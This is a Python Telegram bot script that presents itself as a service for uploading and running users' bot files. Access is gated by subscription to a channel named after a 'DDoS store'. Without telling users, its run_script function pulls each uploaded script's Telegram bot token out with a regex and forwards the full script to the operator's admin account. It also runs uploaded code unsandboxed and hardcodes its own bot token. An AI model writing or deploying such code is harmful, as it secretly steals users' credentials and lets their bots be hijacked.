# Telegram Bot Script

import telebot
import subprocess
import os
import zipfile
import tempfile
import shutil
import requests
import re
import logging
from telebot import types
import time

TOKEN = '7110680515:AAHzMy7BDeIqhkshopy0CaEOc-slSSW5itY'
ADMIN_ID = 5882652117
channel = '@InayatDdosStore'

bot = telebot.TeleBot(TOKEN)
uploaded_files_dir = 'uploaded_bots'
bot_scripts = {}
stored_tokens = {}

if not os.path.exists(uploaded_files_dir):
    os.makedirs(uploaded_files_dir)

def check_subscription(user_id):
    try:
        member_status = bot.get_chat_member(channel, user_id).status
        return member_status in ['member', 'administrator', 'creator']
    except telebot.apihelper.ApiException as e:
        if "Bad Request: member list is inaccessible" in str(e):
            bot.send_message(ADMIN_ID, "⚠️ Cannot access the member list in the channel. Please ensure the bot is an Admin in the channel.")
        logging.error(f"Error checking subscription: {e}")
        return False

def ask_for_subscription(chat_id):
    markup = types.InlineKeyboardMarkup()
    join_button = types.InlineKeyboardButton('📢 Subscribe to the channel', url=f'https://t.me/{channel}')
    markup.add(join_button)
    bot.send_message(chat_id, f"📢 Dear user, you must subscribe to the channel {channel} to use the bot.", reply_markup=markup)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id

    if not check_subscription(user_id):
        ask_for_subscription(message.chat.id)
        return

    markup = types.InlineKeyboardMarkup()
    upload_button = types.InlineKeyboardButton('📤 Upload File', callback_data='upload')
    dev_channel_button = types.InlineKeyboardButton('🔧 Developer Channel', url='https://t.me/InayatDdosStore')
    speed_button = types.InlineKeyboardButton('⚡ Bot Speed', callback_data='speed')
    markup.add(upload_button)
    markup.add(speed_button, dev_channel_button)
    bot.send_message(message.chat.id, f"Welcome, {message.from_user.first_name}! 👋\n✨ You can use the buttons below to control:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'speed')
def bot_speed_info(call):
    try:
        start_time = time.time()
        response = requests.get(f'https://api.telegram.org/bot{TOKEN}/getMe')
        latency = time.time() - start_time
        if response.ok:
            bot.send_message(call.message.chat.id, f"⚡ Bot Speed: {latency:.2f} seconds.")
        else:
            bot.send_message(call.message.chat.id, "⚠️ Failed to get bot speed.")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ An error occurred while checking bot speed: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'upload')
def ask_to_upload_file(call):
    bot.send_message(call.message.chat.id, "📄 Please send the file you want to upload.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id

    if not check_subscription(user_id):
        ask_for_subscription(message.chat.id)
        return

    try:
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_name = message.document.file_name

        if file_name.endswith('.zip'):
            with tempfile.TemporaryDirectory() as temp_dir:
                zip_folder_path = os.path.join(temp_dir, file_name.split('.')[0])

                zip_path = os.path.join(temp_dir, file_name)
                with open(zip_path, 'wb') as new_file:
                    new_file.write(downloaded_file)
                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                    zip_ref.extractall(zip_folder_path)

                final_folder_path = os.path.join(uploaded_files_dir, file_name.split('.')[0])
                if not os.path.exists(final_folder_path):
                    os.makedirs(final_folder_path)

                for root, dirs, files in os.walk(zip_folder_path):
                    for file in files:
                        src_file = os.path.join(root, file)
                        dest_file = os.path.join(final_folder_path, file)
                        shutil.move(src_file, dest_file)

                bot_py_path = os.path.join(final_folder_path, 'bot.py')
                run_py_path = os.path.join(final_folder_path, 'run.py')

                if os.path.exists(run_py_path):
                    run_script(run_py_path, message.chat.id, final_folder_path, file_name, message)
                elif os.path.exists(bot_py_path):
                    run_script(bot_py_path, message.chat.id, final_folder_path, file_name, message)
                else:
                    bot.send_message(message.chat.id, f"❓ I could not find bot.py or run.py. Please send the main file name to run:")
                    bot_scripts[message.chat.id] = {'folder_path': final_folder_path}
                    bot.register_next_step_handler(message, get_custom_file_to_run)

        else:
            if not file_name.endswith('.py'):
                bot.reply_to(message, "⚠️ This bot is only for uploading Python or zip files. 🐍")
                return

            script_path = os.path.join(uploaded_files_dir, file_name)
            with open(script_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            run_script(script_path, message.chat.id, uploaded_files_dir, file_name, message)

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {e}")

def run_script(script_path, chat_id, folder_path, file_name, original_message):
    try:
        requirements_path = os.path.join(os.path.dirname(script_path), 'requirements.txt')
        if os.path.exists(requirements_path):
            bot.send_message(chat_id, "🔄 Installing requirements...")
            subprocess.check_call(['pip', 'install', '-r', requirements_path])

        bot.send_message(chat_id, f"🚀 Running the bot {file_name}...")
        process = subprocess.Popen(['python3', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        bot_scripts[chat_id] = {'process': process}

        token = extract_token_from_script(script_path)
        if token:
            bot_info = requests.get(f'https://api.telegram.org/bot{token}/getMe').json()
            bot_username = bot_info['result']['username']

            user_info = f"@{original_message.from_user.username}" if original_message.from_user.username else str(original_message.from_user.id)
            caption = f"📤 User {user_info} uploaded a new bot file. Bot ID: @{bot_username}"
            bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=caption)

            markup = types.InlineKeyboardMarkup()
            stop_button = types.InlineKeyboardButton(f"🔴 Stop {file_name}", callback_data=f'stop_{chat_id}_{file_name}')
            delete_button = types.InlineKeyboardButton(f"🗑️ Delete {file_name}", callback_data=f'delete_{chat_id}_{file_name}')
            markup.add(stop_button, delete_button)
            bot.send_message(chat_id, f"Use the buttons below to control the bot 👇", reply_markup=markup)
        else:
            bot.send_message(chat_id, f"✅ The bot has started successfully! But I could not retrieve the bot ID.")
            bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=f"📤 User {user_info} uploaded a new bot file, but I could not retrieve the bot ID.")

    except Exception as e:
        bot.send_message(chat_id, f"❌ An error occurred while running the bot: {e}")

def extract_token_from_script(script_path):
    try:
        with open(script_path, 'r') as script_file:
            file_content = script_file.read()

            token_match = re.search(r"['\"]([0-9]{9,10}:[A-Za-z0-9_-]+)['\"]", file_content)
            if token_match:
                return token_match.group(1)
            else:
                print(f"[WARNING] Token not found in {script_path}")
    except Exception as e:
        print(f"[ERROR] Failed to extract token from {script_path}: {e}")
    return None

def get_custom_file_to_run(message):
    try:
        chat_id = message.chat.id
        folder_path = bot_scripts[chat_id]['folder_path']
        custom_file_path = os.path.join(folder_path, message.text)

        if os.path.exists(custom_file_path):
            run_script(custom_file_path, chat_id, folder_path, message.text, message)
        else:
            bot.send_message(chat_id, f"❌ The file you specified does not exist. Please check the name and try again.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ An error occurred: {e}")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    file_name = call.data.split('_')[-1]

    if 'stop' in call.data:
        stop_running_bot(chat_id)
    elif 'delete' in call.data:
        delete_uploaded_file(chat_id)

def stop_running_bot(chat_id):
    if bot_scripts[chat_id]['process']:
        bot_scripts[chat_id]['process'].terminate()
        bot.send_message(chat_id, "🔴 The bot has been stopped.")
    else:
        bot.send_message(chat_id, "⚠️ No bot is currently running.")

def delete_uploaded_file(chat_id):
    folder_path = bot_scripts[chat_id].get('folder_path')
    if folder_path and os.path.exists(folder_path):
        shutil.rmtree(folder_path)
        bot.send_message(chat_id, f"🗑️ The files related to the bot have been deleted.")
    else:
        bot.send_message(chat_id, "⚠️ Files do not exist.")

bot.infinity_polling()
